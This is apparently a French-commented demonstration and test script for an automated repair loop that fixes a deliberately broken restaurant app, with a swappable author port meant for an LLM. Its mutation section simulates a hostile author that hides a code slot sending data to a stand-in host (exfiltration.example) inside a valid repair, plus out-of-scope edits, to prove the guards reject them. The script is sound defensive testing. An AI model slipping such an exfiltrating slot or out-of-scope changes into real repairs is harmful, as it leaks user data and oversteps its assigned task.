// PHASE 9 — DÉMONSTRATION SUR LE SLICE 1 (critère de sortie ROADMAP) :
// « une panne provoquée (le bouton Commander ne fonctionne pas) est
// diagnostiquée et réparée automatiquement, avec analyse d'impact et
// vérification Oracle ; les gardes AST mordent (preuve par mutation) ;
// budget respecté ».
//
// Ce script exécute la chaîne RÉELLE avec les vrais ports :
//   simulateur = compilateur déterministe · juge = Oracle L1 + grille A++.
// L'AUTEUR est déterministe (aucune dépense API, aucun aléa) : le port LLM
// est remplaçable, et les scénarios hostiles ci-dessous prouvent que les
// gardes tiennent QUEL QUE SOIT l'auteur — c'est la propriété qui compte
// pour la sécurité (§27), pas l'identité du rédacteur.
//
// Le CORPUS GELÉ n'est jamais modifié : la panne est injectée dans une
// copie profonde en mémoire.
import { appendFileSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const HERE = dirname(fileURLToPath(import.meta.url));
const REPO = join(HERE, "..", "..");
mkdirSync(join(HERE, "results"), { recursive: true });
const STAMP = new Date().toISOString().replace(/[:.]/g, "-");
const LOG = join(HERE, "results", `repair-${STAMP}.jsonl`);
const log = (o) => { appendFileSync(LOG, JSON.stringify(o) + "\n"); console.log(JSON.stringify(o)); };

const { canonicalJson } = await import(join(REPO, "packages/air-schema/src/index.ts"));
const { compileProject } = await import(join(REPO, "packages/compiler/src/compile-project.ts"));
const { runOracleLevel1, evaluateApxxGrid } = await import(join(REPO, "packages/oracle/src/index.ts"));
const { runRepairLoop, diagnose } = await import(join(REPO, "packages/repair/src/index.ts"));
const { SLOTS_RESTO } = await import(join(REPO, "packages/repair/tests/fixtures/slots-resto.ts"));

const AIR_PATH = join(REPO, "packages/golden-corpus/corpus-v2/resto-quartier.air.json");
const AIR_SAIN = JSON.parse(readFileSync(AIR_PATH, "utf8"));
const clone = (v) => JSON.parse(JSON.stringify(v));
const BOUTON = "blk_menu_bouton_commandes";

// ---------- PORTS RÉELS ----------
const simulator = {
  simulate(state) {
    try {
      const c = compileProject(state.air, undefined, { slots: state.slots });
      return { ok: true, rootHash: c.rootHash, paths: [...c.files.keys()].sort() };
    } catch (e) {
      return { ok: false, rootHash: "", paths: [], error: String(e).slice(0, 160) };
    }
  },
};
const verifier = {
  id: "oracle-l1",
  verify(state) {
    const verdict = runOracleLevel1(state.air, undefined, { slots: state.slots });
    let apxx = [];
    try {
      const c = compileProject(state.air, undefined, { slots: state.slots });
      apxx = evaluateApxxGrid(c.files, state.air).dimensions.map((d) => ({ dimension: d.dimension, state: d.state }));
    } catch { apxx = []; }
    return { passed: verdict.passed, checks: [...verdict.checks], apxx };
  },
};
const oracleSignal = (state) => ({ source: "oracle", checks: [...runOracleLevel1(state.air, undefined, { slots: state.slots }).checks] });

// ---------- ÉTAT DE RÉFÉRENCE (dernier bon connu) ----------
const reference = { air: AIR_SAIN, slots: [] };
const grilleReference = verifier.verify(reference);
log({ etape: "reference", rootHash: simulator.simulate(reference).rootHash.slice(0, 16),
      oracle: grilleReference.passed, apxx: grilleReference.apxx.map((d) => `${d.dimension}:${d.state}`).join(" ") });

// ---------- 1. PANNE PROVOQUÉE : le bouton ne fonctionne plus ----------
const casse = clone(AIR_SAIN);
let injecte = null;
for (const s of casse.screens) for (const b of s.blocks) if (b.id === BOUTON) {
  const p = (b.props ?? []).find((x) => x.key === "actionId");
  injecte = { avant: p.value, apres: `${p.value}_v2` };
  p.value = injecte.apres;
}
const etatCasse = { air: casse, slots: [] };
log({ etape: "panne-provoquee", bloc: BOUTON, ...injecte,
      description: "le bouton « Mes commandes » pointe une action inexistante : il est rendu, cliquable, et ne fait rien" });

const constat = verifier.verify(etatCasse);
log({ etape: "constat-oracle", passed: constat.passed,
      echecs: constat.checks.filter((c) => !c.passed).map((c) => `${c.name}: ${c.detail}`) });
if (constat.passed) throw new Error("la panne provoquée n'est pas détectée — scénario invalide");

// ---------- 2. DIAGNOSTIC ----------
const diag = diagnose(oracleSignal(etatCasse), etatCasse);
log({ etape: "diagnostic", classe: diag.repairClass, cibles: diag.targets, preuves: diag.evidence });

// ---------- 3. RÉPARATION AUTOMATIQUE (AIR) ----------
const auteurAir = {
  id: "auteur-deterministe",
  propose({ diagnosis, state }) {
    const t = diagnosis.targets[0];
    if (!t?.candidate) return null;
    const air = clone(state.air);
    for (const s of air.screens) for (const b of s.blocks) if (b.id === t.blockId) {
      const p = (b.props ?? []).find((x) => x.key === "actionId");
      if (p) p.value = t.candidate;
    }
    return { authorId: "auteur-deterministe", next: { air, slots: state.slots }, edits: [],
             tokens: 120, rationale: `restaure actionId ${t.actionId} → ${t.candidate}` };
  },
};
const r1 = runRepairLoop({ signal: oracleSignal(etatCasse), state: etatCasse, reference,
  budget: { maxAttempts: 3, maxTokens: 10000 }, author: auteurAir, verifier, simulator });
log({ etape: "reparation-air", statut: r1.status, tentatives: r1.attempts, jetons: r1.tokensSpent,
      impact: r1.impact, journal: r1.journal });
if (r1.status !== "repaired") throw new Error(`réparation AIR échouée : ${r1.status}`);
const identique = canonicalJson(r1.state.air) === canonicalJson(AIR_SAIN);
log({ etape: "verification-reparation", airIdentiqueAuDocumentGele: identique,
      oracle: verifier.verify(r1.state).passed });
if (!identique) throw new Error("l'AIR réparé diffère du document gelé");

// ---------- 4. RÉPARATION AUTOMATIQUE (CODE SLOTS) ----------
// Panne réelle et systémique : 5 slots déclarés, 0 implémentation (DET-018).
const signalE2E = { source: "e2e", checks: [{ name: "flow_panier", passed: false, detail: "total du panier absent" }] };
const auteurSlots = {
  id: "auteur-slots",
  propose({ state }) {
    return { authorId: "auteur-slots", next: { air: state.air, slots: SLOTS_RESTO },
             edits: SLOTS_RESTO.map((s) => ({ path: `slots/${s.slotId}.ts`, content: s.source })),
             tokens: 850, rationale: "5 implémentations de Code Slots, pures et sans import" };
  },
};
const etatSain = { air: r1.state.air, slots: [] };
const r2 = runRepairLoop({ signal: signalE2E, state: etatSain, reference: etatSain,
  budget: { maxAttempts: 3, maxTokens: 10000 }, author: auteurSlots, verifier, simulator });
log({ etape: "reparation-slots", statut: r2.status, tentatives: r2.attempts, jetons: r2.tokensSpent,
      impact: r2.impact, journal: r2.journal });
if (r2.status !== "repaired") throw new Error(`réparation slots échouée : ${r2.status}`);

// ---------- 5. PREUVES PAR MUTATION : les gardes AST mordent ----------
const mutations = [
  { nom: "slot-exfiltration-reseau", attendu: "SLOT_NETWORK_ACCESS",
    // L'auteur RÉPARE correctement le bouton — et glisse un slot exfiltrant
    // dans la même livraison (injection indirecte, §27). Le gate doit
    // refuser l'ENSEMBLE : une réparation valide ne blanchit pas sa charge.
    author: { id: "auteur-hostile", propose: () => ({ authorId: "auteur-hostile",
      next: { air: clone(AIR_SAIN), slots: [{ slotId: "slot_libelle_statut_commande", authorId: "auteur-hostile",
        source: 'export function runSlot(e: { statut: string }): { libelle: string } {\n  fetch("https://exfiltration.example/c?s=" + e.statut);\n  return { libelle: e.statut };\n}\n' }] },
      edits: [{ path: "slots/slot_libelle_statut_commande.ts", content: "" }], tokens: 200, rationale: "slot exfiltrant" }) } },
  { nom: "edition-copie-de-bloc", attendu: "PATCH_BLOCK_COPY_EDIT",
    author: { id: "auteur-hostile", propose: ({ state }) => ({ authorId: "auteur-hostile",
      next: { air: clone(AIR_SAIN), slots: state.slots },
      edits: [{ path: "lib/blocks/components.tsx", content: "// copie de bloc réécrite" }], tokens: 200, rationale: "édite un bloc" }) } },
  { nom: "modification-air-hors-cible", attendu: "PATCH_AIR_OUT_OF_TARGET",
    author: { id: "auteur-hostile", propose: () => { const air = clone(AIR_SAIN); air.app.name = "Maquis Express (pirate)";
      return { authorId: "auteur-hostile", next: { air, slots: [] }, edits: [], tokens: 200, rationale: "élargit le périmètre" }; } } },
];
for (const m of mutations) {
  const out = runRepairLoop({ signal: oracleSignal(etatCasse), state: etatCasse, reference,
    budget: { maxAttempts: 1, maxTokens: 10000 }, author: m.author, verifier, simulator });
  const refus = out.journal.filter((e) => !e.ok).map((e) => `${e.stage}: ${e.detail}`);
  const mord = refus.some((r) => r.includes(m.attendu));
  const applique = out.journal.some((e) => e.stage === "apply");
  log({ etape: "mutation", nom: m.nom, attendu: m.attendu, statut: out.status, gardeMord: mord, etatApplique: applique, refus });
  if (!mord || out.status === "repaired" || applique) throw new Error(`garde non mordant : ${m.nom}`);
}

// ---------- 6. BUDGET ----------
const auteurInefficace = { id: "auteur-inefficace",
  propose: ({ state }) => ({ authorId: "auteur-inefficace", next: state, edits: [], tokens: 300, rationale: "sans effet" }) };
const rBudget = runRepairLoop({ signal: oracleSignal(etatCasse), state: etatCasse, reference,
  budget: { maxAttempts: 3, maxTokens: 10000 }, author: auteurInefficace, verifier, simulator });
log({ etape: "budget", statut: rBudget.status, tentatives: rBudget.attempts, jetons: rBudget.tokensSpent,
      etatLivre: rBudget.state !== undefined });
if (rBudget.status !== "budget_exhausted" || rBudget.attempts !== 3 || rBudget.state !== undefined) {
  throw new Error("la borne de budget n'a pas produit un échec propre");
}

// ---------- 7. GRILLE A++ REJOUÉE (amendement D-039) ----------
const compileFinal = compileProject(r2.state.air, undefined, { slots: r2.state.slots });
const grilleFinale = evaluateApxxGrid(compileFinal.files, r2.state.air);
const rang = { non_conforme: 0, non_determinee: 1, conforme: 2 };
const regressions = grilleFinale.dimensions.filter((d) => {
  const avant = grilleReference.apxx.find((x) => x.dimension === d.dimension);
  return avant && rang[d.state] < rang[avant.state];
}).map((d) => d.dimension);
log({ etape: "grille-app", avant: grilleReference.apxx.map((d) => `${d.dimension}:${d.state}`),
      apres: grilleFinale.dimensions.map((d) => `${d.dimension}:${d.state}`),
      detailsApres: grilleFinale.dimensions.map((d) => `${d.dimension}=${d.detail}`), regressions });
if (regressions.length > 0) throw new Error(`régression A++ : ${regressions.join(", ")}`);

// ---------- 8. DÉTERMINISME DE L'ARTEFACT RÉPARÉ ----------
const hashes = Array.from({ length: 5 }, () => compileProject(r2.state.air, undefined, { slots: r2.state.slots }).rootHash);
const stable = new Set(hashes).size === 1;
log({ etape: "determinisme", compilations: hashes.length, rootHash: hashes[0], stable });
if (!stable) throw new Error("artefact réparé non déterministe");

// ---------- SYNTHÈSE ----------
const synthese = {
  phase: 9, slice: "restaurant", horodatage: STAMP,
  panneProvoquee: { bloc: BOUTON, ...injecte },
  reparationAir: { statut: r1.status, tentatives: r1.attempts, jetons: r1.tokensSpent },
  reparationSlots: { statut: r2.status, tentatives: r2.attempts, jetons: r2.tokensSpent, slots: r2.state.slots.length },
  gardesMordants: mutations.map((m) => m.attendu),
  budget: { statut: rBudget.status, tentatives: rBudget.attempts, jetons: rBudget.tokensSpent },
  apxx: grilleFinale.dimensions.map((d) => ({ dimension: d.dimension, etat: d.state, detail: d.detail })),
  rootHashFinal: hashes[0], fichiers: compileFinal.files.size, determinisme: `${hashes.length}/${hashes.length}`,
};
writeFileSync(join(HERE, "results", "repair-phase9.json"), JSON.stringify(synthese, null, 2) + "\n");
log({ etape: "synthese", ...synthese });
console.log("\nPHASE 9 — DÉMONSTRATION SLICE 1 : OK");
